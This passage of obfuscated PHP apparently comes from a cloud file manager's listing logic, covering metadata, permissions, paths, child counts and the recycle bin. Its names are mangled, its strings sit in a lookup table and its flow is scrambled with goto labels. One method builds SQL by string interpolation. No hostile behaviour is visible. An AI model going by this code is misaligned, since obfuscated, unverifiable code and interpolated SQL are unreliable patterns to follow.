$Eƒ®‚Ñ¿£[160] => $Eƒ®‚Ñ¿£[372], $Eƒ®‚Ñ¿£[378] => $Eƒ®‚Ñ¿£[378], $Eƒ®‚Ñ¿£[406] => $Eƒ®‚Ñ¿£[379], $Eƒ®‚Ñ¿£[187] => $Eƒ®‚Ñ¿£[187], $Eƒ®‚Ñ¿£[107] => $Eƒ®‚Ñ¿£[107]); $cÛ”¹ãÔ‚ = Input::get($Eƒ®‚Ñ¿£[407], $Eƒ®‚Ñ¿£[7], $C¨¨—º¾ê”, array_keys($A×Æí‘‚¤í)); goto c½æ†Ÿ„«Û; e½¶èˆ‚éÉ: } protected function _listDataApplyItem($FÌ“ÓˆÂ, $Aù¸çì›·ö = false) { $e›âˆ‡ÈÛ = array($FÌ“ÓˆÂ); $this->_listDataApply($e›âˆ‡ÈÛ, $Aù¸çì›·ö); return $e›âˆ‡ÈÛ[0]; } protected function _listDataApply(&$dœ¦œÖå¦, $EËƒ”•ô’¶ = false) { goto Fİ¼äÉ¤ùÉ; Fµ¾Â“ò¢—: $this->_listAppendPath($dœ¦œÖå¦); $this->_listAppendAuth($dœ¦œÖå¦); $this->_listAppendSourceInfo($dœ¦œÖå¦, $eÉ¥Ÿ²ŸÀã); goto b²½Ş¬Ä…¿; Fİ¼äÉ¤ùÉ: $DÈ¢òœåÏ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$dœ¦œÖå¦) { $dœ¦œÖå¦ = array(); return; } $eÉ¥Ÿ²ŸÀã = array_to_keyvalue($dœ¦œÖå¦, $DÈ¢òœåÏ[33], $DÈ¢òœåÏ[369]); goto Aî‘†¤­à; b²½Ş¬Ä…¿: $this->_listAppendUser($dœ¦œÖå¦); $this->_listFilterInfo($dœ¦œÖå¦, $EËƒ”•ô’¶); goto b£ï‡Êô·ˆ; Aî‘†¤­à: $eÉ¥Ÿ²ŸÀã = array_unique($eÉ¥Ÿ²ŸÀã); $this->_listSourceCache($dœ¦œÖå¦); if (!$EËƒ”•ô’¶) { $this->_listAppendMeta($dœ¦œÖå¦, $eÉ¥Ÿ²ŸÀã); $this->_listAppendFileMeta($dœ¦œÖå¦, $eÉ¥Ÿ²ŸÀã); $this->_listAppendChildren($dœ¦œÖå¦, $eÉ¥Ÿ²ŸÀã); } goto Fµ¾Â“ò¢—; b£ï‡Êô·ˆ: } protected function _listSourceCache($b£öÈ‹Ä‚) { $c´ğ½Í Ö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($b£öÈ‹Ä‚ as $c¢×©§“‚ƒ) { self::$cacheSourceInfo[$c´ğ½Í Ö[410] . $c¢×©§“‚ƒ[$c´ğ½Í Ö[369]]] = $c¢×©§“‚ƒ; } } protected function _listFilterInfo(&$BÙÁôâ¥„°, $c‘ïÄ‚ƒ× = false) { $cõ†ÅÉò‘Œ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($BÙÁôâ¥„° as &$Bâ Òõ©¹ï) { $Bâ Òõ©¹ï = $this->pathInfoFilter($Bâ Òõ©¹ï); self::$cachePathInfo[$cõ†ÅÉò‘Œ[411] . intval($c‘ïÄ‚ƒ×) . $cõ†ÅÉò‘Œ[412] . $Bâ Òõ©¹ï[$cõ†ÅÉò‘Œ[369]]] = $Bâ Òõ©¹ï; } unset($Bâ Òõ©¹ï); } protected function _listMake(&$B¯ù­÷‰Ûö) { $e¨º‘§¶Ä¯ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $B¯ù­÷‰Ûö[$e¨º‘§¶Ä¯[74]] = array(); $B¯ù­÷‰Ûö[$e¨º‘§¶Ä¯[73]] = array(); foreach ($B¯ù­÷‰Ûö[$e¨º‘§¶Ä¯[354]] as $FÎ—¿êÁÔ²) { $C±áÈù£¬Ë = $FÎ—¿êÁÔ²[$e¨º‘§¶Ä¯[370]] == 1 ? $e¨º‘§¶Ä¯[74] : $e¨º‘§¶Ä¯[73]; $B¯ù­÷‰Ûö[$C±áÈù£¬Ë][] = $FÎ—¿êÁÔ²; } unset($B¯ù­÷‰Ûö[$e¨º‘§¶Ä¯[354]]); } protected function _listAppendMeta(&$BñÚÂªØî•, $FÂÌ‘È‡ÌÒ) { goto DŠøƒñ÷ğê; c¨Ï¨–‡…: if (!$aµ£ç±á¨) { return; } $aÛ™£ÍŠ¤Ø = array($CÎâ†•½Å[415], $CÎâ†•½Å[416]); $eä·Õ†Çº¾ = array(); goto AïÅ’µĞ×Ü; AïÅ’µĞ×Ü: foreach ($aµ£ç±á¨ as $bãÜòƒ¹±¨) { if (!isset($eä·Õ†Çº¾[$bãÜòƒ¹±¨[$CÎâ†•½Å[369]]])) { $eä·Õ†Çº¾[$bãÜòƒ¹±¨[$CÎâ†•½Å[369]]] = array(); } if (in_array($bãÜòƒ¹±¨[$CÎâ†•½Å[89]], $aÛ™£ÍŠ¤Ø)) { continue; } $eä·Õ†Çº¾[$bãÜòƒ¹±¨[$CÎâ†•½Å[369]]][$bãÜòƒ¹±¨[$CÎâ†•½Å[89]]] = $bãÜòƒ¹±¨[$CÎâ†•½Å[359]]; } foreach ($BñÚÂªØî• as &$f…²à£ö½) { $f…²à£ö½[$CÎâ†•½Å[417]] = !1; if (isset($eä·Õ†Çº¾[$f…²à£ö½[$CÎâ†•½Å[369]]])) { $f…²à£ö½[$CÎâ†•½Å[417]] = $eä·Õ†Çº¾[$f…²à£ö½[$CÎâ†•½Å[369]]]; } if ($this->fileIsLock($f…²à£ö½) && $f…²à£ö½[$CÎâ†•½Å[376]]) { $FãèæÚ‘£ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $f…²à£ö½[$CÎâ†•½Å[376]][$CÎâ†•½Å[377]] = AuthModel::authDisable($f…²à£ö½[$CÎâ†•½Å[376]][$CÎâ†•½Å[377]], $FãèæÚ‘£); $f…²à£ö½[$CÎâ†•½Å[376]][$CÎâ†•½Å[418]][$CÎâ†•½Å[376]] = $f…²à£ö½[$CÎâ†•½Å[376]][$CÎâ†•½Å[377]]; } } unset($f…²à£ö½); goto A·¯­ÜÁŸÜ; DŠøƒñ÷ğê: $CÎâ†•½Å =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f×Ñ‚™×Îç = array($CÎâ†•½Å[383] => array($CÎâ†•½Å[384], $FÂÌ‘È‡ÌÒ)); $aµ£ç±á¨ = Model($CÎâ†•½Å[413])->field($CÎâ†•½Å[414])->where($f×Ñ‚™×Îç)->select(); goto c¨Ï¨–‡…; A·¯­ÜÁŸÜ: } protected function _listAppendFileMeta(&$fˆœš²ßÂ, $d¼‡¢º½“¡) { goto C’Õ¬§°ó¼; C’Õ¬§°ó¼: $BóóßÂÓÀ« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $d§˜ÈÚàœù = array_to_keyvalue($fˆœš²ßÂ, $BóóßÂÓÀ«[33], $BóóßÂÓÀ«[419]); $d§˜ÈÚàœù = array_filter(array_unique($d§˜ÈÚàœù)); goto F¸„Ç†Šš; eË÷¦Ä÷ší: $bÃò°åİ¨ã = $bÃò°åİ¨ã ? $bÃò°åİ¨ã : array(); $BàğËñÎ”˜ = array(); foreach ($bÃò°åİ¨ã as $BŠ‡†–Ğ³) { if (!isset($BàğËñÎ”˜[$BŠ‡†–Ğ³[$BóóßÂÓÀ«[419]]])) { $BàğËñÎ”˜[$BŠ‡†–Ğ³[$BóóßÂÓÀ«[419]]] = array(); } $BàğËñÎ”˜[$BŠ‡†–Ğ³[$BóóßÂÓÀ«[419]]][$BŠ‡†–Ğ³[$BóóßÂÓÀ«[89]]] = $BŠ‡†–Ğ³[$BóóßÂÓÀ«[359]]; } goto DÔ½ñ ¼õ; DÔ½ñ ¼õ: foreach ($fˆœš²ßÂ as &$B…²ƒË¤Š•) { goto ağ óÁã¾‹; D¼¾íè®Ç…: if (isset($B…²ƒË¤Š•[$BóóßÂÓÀ«[162]][$BóóßÂÓÀ«[426]])) { $B…²ƒË¤Š•[$BóóßÂÓÀ«[426]] = json_decode($B…²ƒË¤Š•[$BóóßÂÓÀ«[162]][$BóóßÂÓÀ«[426]], !0); unset($B…²ƒË¤Š•[$BóóßÂÓÀ«[162]][$BóóßÂÓÀ«[426]]); } goto Fäç¾÷‡¸Í; ağ óÁã¾‹: $F²Â•™’õÃ = $B…²ƒË¤Š•[$BóóßÂÓÀ«[419]]; if (!$F²Â•™’õÃ || !isset($Føåõ‡×©Ò[$F²Â•™’õÃ])) { continue; } $BŠà‘´š†ö = $Føåõ‡×©Ò[$F²Â•™’õÃ]; goto C‰•‡ÚËê“; C‰•‡ÚËê“: $BŠà‘´š†ö[$BóóßÂÓÀ«[77]] = $B…²ƒË¤Š•[$BóóßÂÓÀ«[77]]; $BŠà‘´š†ö[$BóóßÂÓÀ«[28]] = $B…²ƒË¤Š•[$BóóßÂÓÀ«[28]]; self::$cacheFileInfo[$BóóßÂÓÀ«[425] . $F²Â•™’õÃ] = array_merge(array(), $BŠà‘´š†ö); goto a”ˆ™ó»òÙ; a”ˆ™ó»òÙ: unset($Føåõ‡×©Ò[$F²Â•™’õÃ][$BóóßÂÓÀ«[75]]); $E†ÁæŒÎí = is_array($BàğËñÎ”˜[$F²Â•™’õÃ]) ? $BàğËñÎ”˜[$F²Â•™’õÃ] : array(); $B…²ƒË¤Š•[$BóóßÂÓÀ«[162]] = array_merge($E†ÁæŒÎí, $Føåõ‡×©Ò[$F²Â•™’õÃ]); goto D¼¾íè®Ç…; Fäç¾÷‡¸Í: } unset($B…²ƒË¤Š•); goto D¾¨É—àçŠ; cô„È÷ƒ×ˆ: $Føåõ‡×©Ò = Model($BóóßÂÓÀ«[422])->field($DîÉŞÒ´ª)->where($e³……Æ˜ºÇ)->select(); $Føåõ‡×©Ò = array_to_keyvalue($Føåõ‡×©Ò, $BóóßÂÓÀ«[419]); $bÃò°åİ¨ã = Model($BóóßÂÓÀ«[423])->field($BóóßÂÓÀ«[424])->where($e³……Æ˜ºÇ)->select(); goto eË÷¦Ä÷ší; F¸„Ç†Šš: if (!$d§˜ÈÚàœù) { return; } $e³……Æ˜ºÇ = array($BóóßÂÓÀ«[420] => array($BóóßÂÓÀ«[384], $d§˜ÈÚàœù)); $DîÉŞÒ´ª = $BóóßÂÓÀ«[421]; goto cô„È÷ƒ×ˆ; D¾¨É—àçŠ: } protected function _listAppendSourceInfo(&$e‰šƒİ…™è, $D‘êˆè—®ƒ) { goto a••º±œ¾; a••º±œ¾: $a£ ²Æ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!defined($a£ ²Æ[427])) { return; } $CÖ˜ÎÁÛÍ = Model($a£ ²Æ[428])->listData(); goto Fåöóò‡; B½É°²ìæ: $E½ÜƒÇ°ï = array_to_keyvalue_group($b°ÖĞ»è‘, $a£ ²Æ[369]); foreach ($e‰šƒİ…™è as &$Dßª°‹Èå) { $Dßª°‹Èå[$a£ ²Æ[391]] = array($a£ ²Æ[430] => 0, $a£ ²Æ[431] => 0, $a£ ²Æ[432] => 0); if (isset($e°Š®²‘×ï[$Dßª°‹Èå[$a£ ²Æ[369]]])) { $Dßª°‹Èå[$a£ ²Æ[391]][$a£ ²Æ[433]] = 1; $Dßª°‹Èå[$a£ ²Æ[391]][$a£ ²Æ[434]] = $e°Š®²‘×ï[$Dßª°‹Èå[$a£ ²Æ[369]]][$a£ ²Æ[28]]; } if (isset($d†Ä¹éƒ•™[$Dßª°‹Èå[$a£ ²Æ[369]]])) { $Dßª°‹Èå[$a£ ²Æ[391]][$a£ ²Æ[435]] = array(); foreach ($d†Ä¹éƒ•™[$Dßª°‹Èå[$a£ ²Æ[369]]] as $Fòå®¤ƒ‹²) { $c½ÃŸ‹Ñğ = $Aâ…Šô•×ˆ[$Fòå®¤ƒ‹²]; $Dßª°‹Èå[$a£ ²Æ[391]][$a£ ²Æ[435]][] = array($a£ ²Æ[436] => $c½ÃŸ‹Ñğ[$a£ ²Æ[367]], $a£ ²Æ[386] => $c½ÃŸ‹Ñğ[$a£ ²Æ[28]], $a£ ²Æ[437] => $c½ÃŸ‹Ñğ[$a£ ²Æ[438]]); } } if (isset($E½ÜƒÇ°ï[$Dßª°‹Èå[$a£ ²Æ[369]]])) { $Dßª°‹Èå[$a£ ²Æ[391]][$a£ ²Æ[439]] = array(); foreach ($E½ÜƒÇ°ï[$Dßª°‹Èå[$a£ ²Æ[369]]] as $dëœæÛ‹åß) { $Dßª°‹Èå[$a£ ²Æ[391]][$a£ ²Æ[439]] = array($a£ ²Æ[440] => $dëœæÛ‹åß[$a£ ²Æ[441]], $a£ ²Æ[442] => $dëœæÛ‹åß[$a£ ²Æ[443]], $a£ ²Æ[444] => $dëœæÛ‹åß[$a£ ²Æ[369]], $a£ ²Æ[445] => $dëœæÛ‹åß[$a£ ²Æ[446]], $a£ ²Æ[447] => $dëœæÛ‹åß[$a£ ²Æ[448]], $a£ ²Æ[449] => $dëœæÛ‹åß[$a£ ²Æ[449]], $a£ ²Æ[450] => $dëœæÛ‹åß[$a£ ²Æ[450]]); } } } unset($Dßª°‹Èå); goto d‹àÄ”‡Ğ‹; d‹àÄ”‡Ğ‹: return $e‰šƒİ…™è; goto Fóñƒ¹í¡õ; aŞÜÀÇ¼Âœ: $Aâ…Šô•×ˆ = array_to_keyvalue($CÖ˜ÎÁÛÍ, $a£ ²Æ[367]); $d†Ä¹éƒ•™ = array_to_keyvalue_group($FŸ»£ÑÊªŞ, $a£ ²Æ[75], $a£ ²Æ[393]); $e°Š®²‘×ï = array_to_keyvalue($CßÒÜßÇ¶, $a£ ²Æ[75]); goto B½É°²ìæ; Fåöóò‡: $FŸ»£ÑÊªŞ = Model($a£ ²Æ[392])->listData(); $CßÒÜßÇ¶ = Model($a£ ²Æ[381])->listData(); $b°ÖĞ»è‘ = Model($a£ ²Æ[429])->listSimple(); goto aŞÜÀÇ¼Âœ; Fóñƒ¹í¡õ: } protected function _listAppendChildren(&$E–Øê•Î, $dã™ĞÇŒù) { goto f•¸¸µë‡«; c˜°¬·ì§´: foreach ($E–Øê•Î as &$c§„Úœœô) { if ($c§„Úœœô[$cÚ’“«Ùá[370]]) { unset($c§„Úœœô[$cÚ’“«Ùá[372]]); $c§„Úœœô[$cÚ’“«Ùá[192]] = intval($cš­’ô„ñ[$c§„Úœœô[$cÚ’“«Ùá[369]] . $cÚ’“«Ùá[453]][$cÚ’“«Ùá[454]]); $c§„Úœœô[$cÚ’“«Ùá[191]] = intval($cš­’ô„ñ[$c§„Úœœô[$cÚ’“«Ùá[369]] . $cÚ’“«Ùá[455]][$cÚ’“«Ùá[454]]); } } unset($c§„Úœœô); goto EË‰ºÉÙ¶¯; EÜªª²ë‡ô: $e˜¿ÄÜâÕª = 1024 * 50; $E–Øê•Î = is_array($E–Øê•Î) ? $E–Øê•Î : array(); $Bœ¢‹¥º±â = count($E–Øê•Î); goto bŒ’ñÖ’Ç ; bŒ’ñÖ’Ç : $fÇèŠµ…¨ƒ = $this->tablePrefix . $this->tableName; for ($C•âõÛ˜ö = 0; $C•âõÛ˜ö < $Bœ¢‹¥º±â; $C•âõÛ˜ö++) { $b»œÛáó¡î = intval($E–Øê•Î[$C•âõÛ˜ö][$cÚ’“«Ùá[397]]); if ($E–Øê•Î[$C•âõÛ˜ö][$cÚ’“«Ùá[370]]) { $c´®óÒµÇö = $E–Øê•Î[$C•âõÛ˜ö][$cÚ’“«Ùá[369]]; $FˆŠÇëßïÑ .= "\x53\105\x4c\x45\x43\124\40\x2a\x20\x46\122\117\x4d\x20\50\x53\105\114\105\x43\124\x20\x27{$c´®óÒµÇö}\137\x68\141\163\106\x69\154\145\x27\x20\x61\163\x20\x68\141\x73\x2c\143\157\165\x6e\x74\x28\61\51\40\x61\163\x20\x68\141\x73\x43\157\165\156\164\x20\106\122\x4f\x4d\x20\140{$fÇèŠµ…¨ƒ}\140\x20\12\11\11\11\11\x9\167\x68\145\162\x65\40\x70\x61\162\145\x6e\x74\111\104\x3d{$c´®óÒµÇö}\x20\141\156\144\x20\x69\x73\x46\x6f\x6c\x64\145\x72\75\60\x20\x61\x6e\144\40\x69\x73\104\145\154\x65\x74\145\75{$b»œÛáó¡î}\x29\x20\141\163\x20\x74\x62\61\x5f{$c´®óÒµÇö}\40\x75\x6e\151\157\x6e\x20\x61\x6c\154\x20\12\11\11\x9\x9\11\x53\105\114\105\103\124\x20\x2a\40\x46\x52\117\115\x20\50\x53\x45\114\105\x43\124\40\47{$c´®óÒµÇö}\x5f\x68\x61\163\106\x6f\154\x64\x65\162\47\x20\x61\163\x20\x68\x61\163\106\151\154\x65\54\x63\157\x75\156\164\x28\x31\x29\40\x61\163\40\x68\141\x73\x43\x6f\x75\x6e\x74\x20\x46\122\117\x4d\x20\x60{$fÇèŠµ…¨ƒ}\140\40\xa\11\x9\11\x9\x9\x77\150\145\x72\x65\x20\160\x61\162\x65\156\164\111\x44\75{$c´®óÒµÇö}\40\x61\156\x64\40\x69\163\x46\157\x6c\144\145\x72\x3d\61\x20\141\156\144\x20\151\163\x44\x65\154\145\x74\x65\x3d{$b»œÛáó¡î}\x29\40\141\163\x20\164\x62\x32\x5f{$c´®óÒµÇö}\40\x75\x6e\x69\157\x6e\40\141\x6c\x6c\x20"; } if ((strlen($FˆŠÇëßïÑ) >= $e˜¿ÄÜâÕª || $C•âõÛ˜ö == $Bœ¢‹¥º±â - 1) && $FˆŠÇëßïÑ) { $FˆŠÇëßïÑ = substr($FˆŠÇëßïÑ, 0, -strlen($cÚ’“«Ùá[451])); $cÁŠä¬¨²è = $this->query($FˆŠÇëßïÑ); $cš­’ô„ñ = array_merge($cš­’ô„ñ, $cÁŠä¬¨²è); $FˆŠÇëßïÑ = $cÚ’“«Ùá[33]; } } $cš­’ô„ñ = array_to_keyvalue($cš­’ô„ñ, $cÚ’“«Ùá[452]); goto c˜°¬·ì§´; f•¸¸µë‡«: $cÚ’“«Ùá =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FˆŠÇëßïÑ = $cÚ’“«Ùá[361]; $cš­’ô„ñ = array(); goto EÜªª²ë‡ô; EË‰ºÉÙ¶¯: } protected function _listAppendAuth(&$bÖ™ëà·Üê) { goto D¥ö‰ì´‰; EÓìÌ­”Ÿ¹: foreach ($bÖ™ëà·Üê as $F¾©ŞÌÜá¼) { if ($F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[371]] == self::TYPE_GROUP) { $CÁù¾†µù[] = $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[369]]; } } if (!$CÁù¾†µù) { return; } $Eõ¯ÔßÂ±ˆ = array_to_keyvalue($bÖ™ëà·Üê, $DÊ³˜Ç®ÛÔ[369]); goto aÍ‰âçˆÂÈ; D¥ö‰ì´‰: $DÊ³˜Ç®ÛÔ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!defined($DÊ³˜Ç®ÛÔ[427])) { return; } $CÁù¾†µù = array(); goto EÓìÌ­”Ÿ¹; aÍ‰âçˆÂÈ: $aåÁ˜÷‡™ = Model($DÊ³˜Ç®ÛÔ[456])->getSourceList($CÁù¾†µù, $Eõ¯ÔßÂ±ˆ); foreach ($bÖ™ëà·Üê as $cÄµ„Ë ğ· => &$F¾©ŞÌÜá¼) { $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]] = $aåÁ˜÷‡™[$F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[369]]]; if (!$F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]] && $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[371]] == self::TYPE_GROUP) { $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]] = Action($DÊ³˜Ç®ÛÔ[457])->pathGroupAuthMake($F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[458]]); if (!$F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]] && !_get($GLOBALS, $DÊ³˜Ç®ÛÔ[459])) { $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[189]] = !1; $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[188]] = !1; } } if ($F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]]) { $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[189]] = AuthModel::authCheckEdit($F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]][$DÊ³˜Ç®ÛÔ[377]]); $F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[188]] = AuthModel::authCheckView($F¾©ŞÌÜá¼[$DÊ³˜Ç®ÛÔ[376]][$DÊ³˜Ç®ÛÔ[377]]); } $this->groupPathDisplay($F¾©ŞÌÜá¼); } unset($F¾©ŞÌÜá¼); goto d‹ïÁ©Š£à; d‹ïÁ©Š£à: } public function groupPathDisplay(&$c¢¾Ñ‡‹) { goto EÒíÆ›ƒğ½; d·×ÓÈšæ­: $c¢¾Ñ‡‹[$b®ó©¬à´¿[462]] = $FÄŒŸÍ§ãµ[$b®ó©¬à´¿[463]]; $c¢¾Ñ‡‹[$b®ó©¬à´¿[380]] = $FÄŒŸÍ§ãµ[$b®ó©¬à´¿[461]]; $c¢¾Ñ‡‹[$b®ó©¬à´¿[464]] = $FÄŒŸÍ§ãµ[$b®ó©¬à´¿[465]]; goto AÓ•¹³É“¨; EÒíÆ›ƒğ½: $b®ó©¬à´¿ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($c¢¾Ñ‡‹[$b®ó©¬à´¿[371]] != self::TYPE_GROUP) { return; } $FÄŒŸÍ§ãµ = Model($b®ó©¬à´¿[460])->getInfo($c¢¾Ñ‡‹[$b®ó©¬à´¿[458]]); goto C¯Êß‹ÍÜ‘; C¯Êß‹ÍÜ‘: $bÍéğÎ— = $this->parentLevelArray($FÄŒŸÍ§ãµ[$b®ó©¬à´¿[461]]); $Fƒß§÷ïªµ = $b®ó©¬à´¿[33]; foreach ($bÍéğÎ— as $F‹ÀÑîñŞ) { $C°¤œ”© = Model($b®ó©¬à´¿[460])->getInfo($F‹ÀÑîñŞ); $Fƒß§÷ïªµ .= $C°¤œ”©[$b®ó©¬à´¿[391]][$b®ó©¬à´¿[369]] . $b®ó©¬à´¿[47]; } goto d·×ÓÈšæ­; AÓ•¹³É“¨: $c¢¾Ñ‡‹[$b®ó©¬à´¿[466]] = $Fƒß§÷ïªµ . $FÄŒŸÍ§ãµ[$b®ó©¬à´¿[391]][$b®ó©¬à´¿[369]]; goto fô¶£ÄÒ¼; fô¶£ÄÒ¼: } protected function _listAppendPath(&$C¦Ç—Œ²Œ¸) { goto f¾¼ÅóøŞÎ; D¦ÔÙöÚ‰: return $C¦Ç—Œ²Œ¸; goto bÈ…›ô¿‚; fµİÄÔ­¥: $eãøïÅ™„ù = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($C¦Ç—Œ²Œ¸ as &$Aé£Š’¨–) { goto fƒÍÜ‚â‘Í; C‘åÔÉĞ‚: $C«êŒ‰Ìò¤ = trim($Aé£Š’¨–[$DÉ­«°İÂ[468]], $DÉ­«°İÂ[8]); if ($Aé£Š’¨–[$DÉ­«°İÂ[463]] == $DÉ­«°İÂ[470] && $C«êŒ‰Ìò¤) { $Aé£Š’¨–[$DÉ­«°İÂ[28]] = $C«êŒ‰Ìò¤; } $this->_listAppendPathRecycle($Aé£Š’¨–, $d‚“öÒ¿È, $eãøïÅ™„ù); goto bªÍ÷„à¿; BåÑ¼ÃŞõ: if ($d‚“öÒ¿È) { $b°æ†ˆ±Ñç .= $Aé£Š’¨–[$DÉ­«°İÂ[28]]; } if ($Aé£Š’¨–[$DÉ­«°İÂ[370]]) { $b°æ†ˆ±Ñç .= $DÉ­«°İÂ[8]; } $Aé£Š’¨–[$DÉ­«°İÂ[468]] = str_replace($DÉ­«°İÂ[469], $DÉ­«°İÂ[8], $b°æ†ˆ±Ñç); goto C‘åÔÉĞ‚; fƒÍÜ‚â‘Í: $d‚“öÒ¿È = $this->parentLevelArray($Aé£Š’¨–[$DÉ­«°İÂ[461]]); $b°æ†ˆ±Ñç = $this->_listAppendPathRoot($Aé£Š’¨–, $d‚“öÒ¿È); foreach ($d‚“öÒ¿È as $a®¹‰İ‡›Õ => $DŠ»Ùë×§É) { if ($a®¹‰İ‡›Õ == 0 && $b°æ†ˆ±Ñç && $Aé£Š’¨–[$DÉ­«°İÂ[371]] == self::TYPE_GROUP) { continue; } if (isset($aæ…ÙÖÆ¦Ğ[$DŠ»Ùë×§É])) { $b°æ†ˆ±Ñç .= $aæ…ÙÖÆ¦Ğ[$DŠ»Ùë×§É] . $DÉ­«°İÂ[8]; } } goto BåÑ¼ÃŞõ; bªÍ÷„à¿: } unset($Aé£Š’¨–); goto D¦ÔÙöÚ‰; A×À§â¥•‹: foreach ($C¦Ç—Œ²Œ¸ as &$Aé£Š’¨–) { $aæ…ÙÖÆ¦Ğ[$Aé£Š’¨–[$DÉ­«°İÂ[369]]] = $Aé£Š’¨–[$DÉ­«°İÂ[28]]; $d‚“öÒ¿È = $this->parentLevelArray($Aé£Š’¨–[$DÉ­«°İÂ[461]]); foreach ($d‚“öÒ¿È as $a®¹‰İ‡›Õ => $DŠ»Ùë×§É) { if ($a®¹‰İ‡›Õ != 0 && !isset($aæ…ÙÖÆ¦Ğ[$DŠ»Ùë×§É])) { $e’¸—ˆ¡Ïè[] = $DŠ»Ùë×§É; } } } unset($Aé£Š’¨–); if (count($e’¸—ˆ¡Ïè) > 0) { $Fé»ĞÏíêä = array($DÉ­«°İÂ[383] => array($DÉ­«°İÂ[384], $e’¸—ˆ¡Ïè)); if (count($e’¸—ˆ¡Ïè) == 1) { $eæ¼Ê¼Ü™¦ = $this->sourceInfo($e’¸—ˆ¡Ïè[0]); $aŠÙ•…õïø = is_array($eæ¼Ê¼Ü™¦) ? array($eæ¼Ê¼Ü™¦) : !1; } else { $aŠÙ•…õïø = $this->field($DÉ­«°İÂ[467])->where($Fé»ĞÏíêä)->select(); } $F†µÛ¤«¯ = array_to_keyvalue($aŠÙ•…õïø, $DÉ­«°İÂ[369], $DÉ­«°İÂ[28]); $aæ…ÙÖÆ¦Ğ = array_merge_index($aæ…ÙÖÆ¦Ğ, $F†µÛ¤«¯); } goto fµİÄÔ­¥; f¾¼ÅóøŞÎ: $DÉ­«°İÂ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $aæ…ÙÖÆ¦Ğ = array(); $e’¸—ˆ¡Ïè = array(); goto A×À§â¥•‹; bÈ…›ô¿‚: } private function _listAppendPathRecycle(&$Cã¾Õî„ìâ, $aÈ ±¢˜·¦, $dßÚªƒäËŒ) { goto e‰ç•Â’°É; FáÌ¤¥¬ç•: $Cã¾Õî„ìâ[$D¬ŠŞàö‚[461]] = $D¬ŠŞàö‚[472] . implode($D¬ŠŞàö‚[47], array_slice($aÈ ±¢˜·¦, 1)) . $D¬ŠŞàö‚[47]; if ($Cã¾Õî„ìâ[$D¬ŠŞàö‚[369]] == $dßÚªƒäËŒ) { $Cã¾Õî„ìâ[$D¬ŠŞàö‚[461]] = $D¬ŠŞàö‚[472]; $Cã¾Õî„ìâ[$D¬ŠŞàö‚[463]] = $D¬ŠŞàö‚[470]; $Cã¾Õî„ìâ[$D¬ŠŞàö‚[28]] = LNG($D¬ŠŞàö‚[471]); } $Cã¾Õî„ìâ[$D¬ŠŞàö‚[473]] = $D¬ŠŞàö‚[474]; goto d¼“ÚÖ÷Ëá; e‰ç•Â’°É: $D¬ŠŞàö‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (intval($Cã¾Õî„ìâ[$D¬ŠŞàö‚[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($dßÚªƒäËŒ, $aÈ ±¢˜·¦) && $Cã¾Õî„ìâ[$D¬ŠŞàö‚[369]] != $dßÚªƒäËŒ) { return; } goto dìŠÀ ¹Ó–; dìŠÀ ¹Ó–: $a¾Õõ°Û‰¿ = explode($D¬ŠŞàö‚[8], trim($Cã¾Õî„ìâ[$D¬ŠŞàö‚[468]], $D¬ŠŞàö‚[8])); $aêÛ¾¡‰æ = implode($D¬ŠŞàö‚[8], array_slice($a¾Õõ°Û‰¿, 2)); $Cã¾Õî„ìâ[$D¬ŠŞàö‚[468]] = $D¬ŠŞàö‚[8] . LNG($D¬ŠŞàö‚[471]) . $D¬ŠŞàö‚[8] . ltrim($aêÛ¾¡‰æ, $D¬ŠŞàö‚[8]); goto FáÌ¤¥¬ç•; d¼“ÚÖ÷Ëá: } protected function _listAppendPathRoot(&$Fåë¨Ğöó™, $cÊ¥ÒõéÔ¾) { $CĞŠòğÙ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $dóäá„ù®ñ = $CĞŠòğÙ[33]; if ($Fåë¨Ğöó™[$CĞŠòğÙ[371]] == self::TYPE_USER) { if (defined($CĞŠòğÙ[427]) && $Fåë¨Ğöó™[$CĞŠòğÙ[458]] == USER_ID) { $dóäá„ù®ñ = LNG($CĞŠòğÙ[475]); if (!$cÊ¥ÒõéÔ¾) { $Fåë¨Ğöó™[$CĞŠòğÙ[28]] = $dóäá„ù®ñ; } } else { $F‚½­´ÁŠÀ = Model($CĞŠòğÙ[476])->getInfoSimple($Fåë¨Ğöó™[$CĞŠòğÙ[458]]); $dóäá„ù®ñ = LNG($CĞŠòğÙ[477]) . $CĞŠòğÙ[157] . $F‚½­´ÁŠÀ[$CĞŠòğÙ[28]] . $CĞŠòğÙ[478]; } } else { if ($Fåë¨Ğöó™[$CĞŠòğÙ[371]] == self::TYPE_GROUP) { $F‚½­´ÁŠÀ = 